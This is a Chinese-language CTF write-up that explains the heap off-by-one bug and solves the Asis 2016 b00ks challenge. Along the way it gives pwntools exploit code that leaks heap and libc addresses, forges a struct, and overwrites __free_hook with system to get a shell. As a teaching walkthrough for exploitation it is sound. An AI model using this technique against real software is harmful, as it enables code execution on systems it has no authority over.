堆利用之off_by_one


  顾名思义就是溢出一个字节，当程序在缓冲区写入并溢出时，写入的字节数超过了这个缓冲区本身所申请的字节数且只越界了一个字节。


漏洞原理

其与整数溢出类似，往往都是对边界检测不严谨造成的溢出一字节情况，通常分为下面两种情况


1、循环语句的循环次数设置不严谨

for (i=0; i<=size; i++)

因为循环体是从0开始循环，而循环的结束语句确实当i小于等于指定size时才退出，程序员本身希望循环size次，却因为构造循环语句的不严谨多循环了一次，这就有可能造成off-by-one

2、对字符串长度的错误判断

if (strlen(buf) == 8){  strcpy(v1, buf);}

strlen函数是判断'\x00'前一共有多少字符，并不包括'\x00'，当我们使用strcpy函数将buf的内容复制到v1中时，'\x00'会一同被拷贝过去，所以实际上v1中总共拷贝了9个字节，造成了溢出



例题：Asis_2016_b00ks

图书管理的菜单类型题，通过我们输入的数字来对书籍进行不同的操作

输入1：创建book

输入2：删除book

输入3：添加book的说明

输入4：输出所有book的信息

输入5：更改作者名字

这里我们着重看name函数与create函数

name函数

在输入name的函数中发现了存在off_by_one漏洞，循环体共循环了33次，并且在其退出前name_ptr指针执行了++操作，也就是说当我们输入的字符是32时，第33位会被置零

create函数

在create函数中我们找到了book的结构体，其中依次存放了book_id，指向book_name的指针，指向book_desc的指针，以及book_desc的大小信息。然后指向book的结构体的指针通过id来存放每一个book结构体，跟进book_struct_ptr

在这里可以看出name_ptr跟book_struct_ptr的距离正好是32，也就是说我们的off_by_one漏洞可以将book_struct_ptr的最低位置零，也可以利用这个漏洞将book_struct_ptr的地址泄露出来。

利用过程

1、泄露book_struct_ptr的地址

程序开启了pie保护，所以我们首先需要做的便是泄露地址

使用gdb调试，先输入32个字节的a触发off_by_one漏洞，再创建一个book1，然后ctrl+c

这里我们用pwndbg的search命令寻找我们刚才输入的32个a，发现其在0x555555756040处

查看其中的内容，0x61是a的16进制表示，而正如我们先前看到的book_struct_ptr与name_ptr的距离是32位，并且因为off-by-one的缘故现在它们的内容并没有'\x00'进行隔离，也就是说当我们调用功能4print函数打印book信息时，book1_struct_ptr的地址会被打印出来（printf函数打印'\x00'前的内容）

可以看到我们调用4来打印book的信息时32个a后面紧跟着一串乱码，这就是book1_struct_ptr的地址

对应exp如下所示

p.sendlineafter(": ", "a"*32)Create(0x20, "book1_name", 0x20, "book1_desc")Print()p.recvuntil("a"*32)book1_struct_addr = u64(p.recv(6).ljust(8, '\x00'))log.success("book1_struct_addr: 0x%x" % book1_struct_addr)

第一步泄露book1_struct_ptr地址完成

2、利用off-by-one漏洞伪造book1&&泄露libc基地址

这里我们获取了book1的结构体指针的地址，然后我们创建book2，只不过这次我们让这个book2申请的内存大一些

Create(0x21000, "book2_name", 0x21000, "book2_desc")

为什么需要创建这么大的内存呢，这里就涉及到堆申请内存的一些知识了，平时我们申请内存的时候系统都是通过控制brk的伸缩来完成的，但是当我们申请了过大的内存时，会通过mmap来分配虚拟内存空间，而mmap所申请的内存空间与libc的基地址之间的偏移是固定的，而我们的最终目的获得shell，那么获取libc的基地址就尤为重要了，这里我们申请book2的内存空间为0x21000，让book2_name与book2_desc的指针落在mmap申请的虚拟内存上，如下图所示

然后就是使用off-by-one漏洞了，这次我们将book1的最低位覆盖为0，如下图所示

而我们这么做的目的，就是通过off-by-one漏洞将原book1结构体指针指向一个我们可以写入的地址，我们可以通过修改book的大小令这个被覆盖了最低位的地址指向book1的desc指针处，如下图所示

当我们完成了修改book1_ptr地址任务就可以开始构建fake_book了，我们在前面已经知道了book结构体包含的信息，而我们这里只要将伪造的fake_book的id改为1，那么后续针对book1的操作都会在我们这个fake_book上执行了，构建成如下样子的fake_book

book_id = 1book_name_ptr = book2_name_ptrbook_desc_ptr = book2_name_ptrbook_desc_size = 0x210000

我们先计算一下book2_struct_ptr的地址是多少，因为其距离book1结构体指针的偏移是固定的，所以直接令两个地址相减就能算出偏移

对应exp

Create(0x21000, "book2_name", 0x21000, "book2_desc")book2_struct_addr = book1_struct_addr + 0x30log.success("book2_struct_addr: 0x%x" % book2_struct_addr)

而这里将book_name_ptr与desc_ptr都指向book2的name指针地址是为了我们的第三步：泄露libc的基地址，我们之前说过，mmap申请的内存与libc的基地址偏移是固定的，而偏移可以用下面这个公式来算

offset = mmap分配地址 - libc基地址

因为我们在上面把book2_name的指针地址赋给了fake_book的两个指针，所以mmap分配的地址我们只需要输出fake_book的信息就可以获得

然后我们只要接收一下这个结果就可以了，对应exp

fake_book = p64(1) + p64(book2_struct_addr+0x8) + p64(book2_struct_addr+0x8) + p64(0x21000)Edit(1, fake_book)Change("b"*32)Print()p.recvuntil("Name: ")book2_name_ptr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))

log.success("book2_name_ptr: 0x%x" % book2_name_ptr)﻿libc的基地址可以用pwndbg的vmmap获得


libc_base = book2_name_ptr - 6156304

3、通过free_hook获得shell

至此我们完成了所有准备工作，而要获得shell我们要利用free_hook来完成，那么什么是free_hook呢，我们来看一下函数原型

void __libc_free(void *mem) {    mstate    ar_ptr;    mchunkptr p; /* chunk corresponding to mem */
    void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);    if (__builtin_expect(hook != NULL, 0)) {        (*hook)(mem, RETURN_ADDRESS(0));        return;    }}

在我们执行free函数的时候，会判断free_hook中是否有函数，如果有就直接执行，而这也正是我们所需要的，如果我们令free_hook等于system函数的真实地址，并且free了一个带有/bin/sh的堆块，那么程序就会执行system("/bin/sh")函数，这也正是我们想要的结果，首先我们先算出对应的基地址

free_hook = libc.symbols['__free_hook'] + libc_basesystem = libc.symbols['system'] + libc_base

binsh_addr = libc.search('/bin/sh').next() + libc_base

然后我们通过edit函数将binsh和free_hook写入book2的name指针和desc指针中，因为前面我们将fake_book的desc指针也指向了book2的name指针处，所以我们这里通过调用edit函数修改fake_book的desc，也就是book2的name指针中的内容

Edit(1, p64(binsh_addr)+p64(free_hook))
这里因为book2的name指针与desc指针的距离是8，所以我们上面这么写就可以把book2的desc指针指向的地址改为free_hook的地址，然后我们只需要将system地址写入其中并free掉book2就可以获得shell了
Edit(2, p64(system))Free(2)
